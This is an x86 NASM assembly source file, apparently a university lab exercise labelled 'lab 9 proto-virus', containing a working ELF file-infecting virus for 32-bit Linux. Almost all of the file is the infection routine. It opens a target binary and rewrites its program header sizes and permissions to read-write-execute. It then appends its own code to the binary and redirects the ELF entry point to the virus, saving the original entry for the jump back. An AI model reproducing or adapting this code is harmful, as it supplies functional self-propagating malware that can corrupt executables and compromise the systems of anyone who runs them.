%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

; arg2 exit code
%macro  exit 1
	syscall1 1, %1
%endmacro

; arg2 file descriptor, arg3 pointer to output buffer, arg4 count of bytes to send, returns number of bytes sent
%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

; arg2 file descriptor, arg3 pointer to input buffer, arg4 buffer size max, returns number of bytes received
%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

; arg2 the file pathname, arg3 file access flags(O_RDONLY,O_APPEND,O_WRONLY,O_RDWR), arg4 file permission (0777, 0644)
%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

;arg2 file descriptor, arg3 offset, arg4 origin (SEEK_SET, SEEK_CUR, SEEK_END)
%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

;arg2 file descriptor
%macro  close 1
	syscall1 6, %1
%endmacro

O_WRONLY equ 1
O_APPEND equ 1024
O_RDONLY equ 0
O_RDWR   equ 2
%define	FREAD		0x0001
%define	FWRITE		0x0002
%define	O_NONBLOCK	0x0004		;/* no delay */
%define	O_APPEND	0x0008		;/* set append mode */
%define	O_SHLOCK	0x0010		;/* open with shared file lock */
%define	O_EXLOCK	0x0020		;/* open with exclusive file lock */
%define	O_ASYNC		0x0040		;/* signal pgrp when data ready */
%define	O_FSYNC		0x0080		;/* synchronous writes */
%define	O_CREATE	0x0200		;/* create if nonexistant */
%define	O_TRUNC		0x0400		;/* truncate to zero length */
%define	O_EXCL		0x0800		;/* error if already exists */
%define	FMARK		0x1000		;/* mark during gc() */
%define	FDEFER		0x2000		;/* defer for next gc pass */
%define	FHASLOCK	0x4000		;/* descriptor holds advisory lock */

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_CUR 1
%define SEEK_SET 0
%define STDIN  0
%define STDOUT 1
%define STDERR 2
%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
;%define mem_start 0x08048000
;%define original_start 0x8048080
%define entry_point 0x18
%define phOff 0x1C

;/*}Elf32_Ehdr;*/
;  /*unsigned char	e_ident[EI_NIDENT];	 Magic number and other info */
;  /*Elf32_Half	e_type;			 Object file type */
;  /*Elf32_Half	e_machine;		 Architecture */
;  /*Elf32_Word	e_version;		 Object file version */
;  /*Elf32_Addr	e_entry;		 Entry point virtual address */
;  /*Elf32_Off	e_phoff;		 Program header table file offset */
;  /*Elf32_Off	e_shoff;		 Section header table file offset */
;  /*Elf32_Word	e_flags;		 Processor-specific flags */
;  /*Elf32_Half	e_ehsize;		 ELF header size in bytes */
;  /*Elf32_Half	e_phentsize;	 Program header table entry size */
;  /*Elf32_Half	e_phnum;		 Program header table entry count */
;  /*Elf32_Half	e_shentsize;	 Section header table entry size */
;  /*Elf32_Half	e_shnum;		 Section header table entry count */
;  /*Elf32_Half	e_shstrndx;		 Section header string table index */;;

;/*Elf32_Phdr;
;/*Elf32_Word	p_type;			Segment type */
;/*Elf32_Off	p_offset;		Segment file offset */
;/*Elf32_Addr	p_vaddr;		Segment virtual address */
;/*Elf32_Addr	p_paddr;		Segment physical address */
;/*Elf32_Word	p_filesz;		Segment size in file */
;/*Elf32_Word	p_memsz;		Segment size in memory */
;/*Elf32_Word	p_flags;		Segment flags */
;/*Elf32_Word	p_align;		Segment alignment */

	
global _start

section .text
virus_start:
jmp _start


name:	db "ELFexec", 0
nameLen: db 0

msg: db "This is a virus",10,0
msgLen: db 0

OutStr: db "The lab 9 proto-virus strikes!", 10, 0
OutStrLen: db 0

Failstr: db "perhaps not", 10 , 0
FailstrLen: db 0


get_my_loc:
	call next_i
next_i:
	pop ecx
	ret
_start:	
	push ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	call get_my_loc
	sub ecx, next_i - msg
	write STDOUT, ecx, msgLen-msg
	;Open an ELF file with a given constant name "ELFexec". The open mode should be RDWR, rather than APPEND.
	call get_my_loc
	sub ecx, next_i - name
	mov esi, ecx 			
	open esi, O_RDWR, 0644
	mov esi, eax ;esi holds fd, probably 3
	cmp eax, 0
	jl VirusError ;fd = -1 -> no file was opened
	mov edi, ebp
	sub edi, 4 ; ebi = ebp-4
	read esi, edi , 4 ; read 4 bytes into [ebp-4]
	cmp eax, 0
	jl VirusError ;eax < 0  -> was unable to read from file
	cmp byte [edi+3], 'F'
	jne VirusError
	cmp byte [edi+2], 'L'
	jne VirusError
	cmp byte [edi+1], 'E'
	jne VirusError
	;at this point, the opened file is of ELF type
	;task3
	lseek esi, phOff, SEEK_SET
	mov edi, ebp
	sub edi, 12
	read esi, edi, 4;read 1st program header offset to edi, [ebp-12]
	lseek esi, dword[edi], SEEK_SET; fd points to first program header
	lseek esi, 8, SEEK_CUR ;fd points to virtual address of first program header (where the code starts)
	sub edi, 4; edi <- ebp - 16
	read esi, edi, 4; entry point of original file put in [ebp-16], fd points to ph[0].p_vaddr
	lseek esi, 20, SEEK_CUR;fd points to second program header
	;Task3 correction ----------
	lseek esi, 4, SEEK_CUR; fd points to p_offset of second ph
	sub edi ,4; edi <- ebp - 20
	read esi, edi, 4; [ebp-20] <- ph[1].p_offset, fd points to ph[1].p_vaddr
	sub edi, 4; edi <- ebp - 24
	read esi, edi, 4; [ebp-24] <- ph[1].p_vaddr, fd points to ph[1].p_paddr
	;----------------------
	lseek esi, 4, SEEK_CUR;fd points to ph[1].p_filesz
	sub edi, 4; edi <- ebp - 28
	read esi, edi, 4; [ebp-28] <- p_filesz
	mov edx, [edi]
	add edx, virus_end - virus_start
	mov [edi], edx; [ebp-28] <- p_filesz + virus size
	lseek esi, -4, SEEK_CUR
	write esi, edi, 4; write new p_filesz to file
	read esi, edi, 4; [ebp-28] <- p_memsz
	mov edx, [edi]
	add edx, virus_end - virus_start
	mov [edi], edx; [ebp-28] <- p_memsz + virus size
	lseek esi, -4, SEEK_CUR
	write esi, edi, 4; write new p_memsz to file
	mov dword[edi], 7
	write esi, edi, 4;change program header flag to RWE
	;endOfTask3	
	lseek esi, 0, SEEK_END 	;finding end of file, to append virus, TODO find why do I need number of bytes in the file
	;task2
	add eax, dword[ebp-16] ;eax holds the size of file + location in virtual memory = location of virus in memory
	mov dword [ebp-4], eax; [ebp-4] holds the *new* entry
	;task2 end
	call get_my_loc
	sub ecx, next_i - virus_start ; ecx points to the beginning of the code
	mov edi, ecx 
	write esi, edi, virus_end - virus_start ;write to opened file, from the beginning of the virus, (size of code) bytes
	cmp eax, 0
	jle VirusError
	;task1
	lseek esi, entry_point, SEEK_SET ;file descriptor now points to the location of the entry point
	mov edi, ebp
	sub edi, 8 ;edi holds pointer to buffer that the original entry point will be entered
	read esi, edi, 4 ;[ebp-8] holds the *original* entry point
	;call get_my_loc
	;sub ecx, next_i - PreviousEntryPoint;ecx points to the location to put original entry point in virus
	;lseek esi, 0, SEEK_END
	;add ecx, eax
	lseek esi, -4, SEEK_END ;location of the end of the file (after planting the virus) - 4 = location reserved for original entry point "PreviousEntryPoint"
	write esi, edi, 4; forcely writing the *original* entry point at the above location
	mov edi, ebp
	sub edi, 24 ;edi holds the pointer to the virtual address of the 2nd ph (from [ebp-24])
	lseek esi, 0, SEEK_END
	add dword [edi], eax; [ebp-24] <- ph[1].p_vaddr + (file size + virus size)
	sub dword [edi], virus_end - virus_start; [ebp-24] <- ph[1].p_vaddr + file size (virus offset)
	mov edx, edi; edx = ebp - 24
	add edx, 4; edx = ebp - 20, ([ebp-20] = ph[1].p_offset)
	mov edx, dword[edx]; edx <- ph[1].p_offset (the value, not the pointer)
	sub dword [edi], edx; [ebp-24] <- ph[1].p_vaddr + virus_offset - ph1[1].p_offset.... the end of the location the 2nd ph will be loaded into memory
	lseek esi, entry_point, SEEK_SET ;file descriptor now points to the location of the entry point in the ELF header
	write esi, edi, 4;write new entry address to entry point
	jmp VirusExit



VirusExit:
	call get_my_loc
	sub ecx, next_i - OutStr
	write STDOUT, ecx, OutStrLen - OutStr
    exit 0            ; Termination if all is OK and no previous code to jump to
                      ; (also an example for use of above macros)

VirusError:
	;task2
	;push original_start; push the entry point of the original program, *assuming address known*
	call get_my_loc
	add ecx, virus_end - next_i
	push dword [ecx-4]
	ret
	;prev task
	call get_my_loc
	sub ecx, next_i - Failstr
	write STDOUT, ecx, FailstrLen - Failstr
	exit 1


PreviousEntryPoint: dd VirusExit ;The original entry point was forcely written to this address for the copy of the virus to use while planting the virus
virus_end:


